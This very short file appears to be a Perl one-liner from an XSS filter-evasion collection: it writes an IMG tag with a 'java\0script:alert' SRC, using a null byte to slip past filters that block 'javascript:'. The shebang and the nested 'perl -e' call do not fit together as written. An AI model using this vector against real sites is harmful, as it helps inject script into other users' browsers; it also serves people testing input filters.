#!/usr/bin/env perl

perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out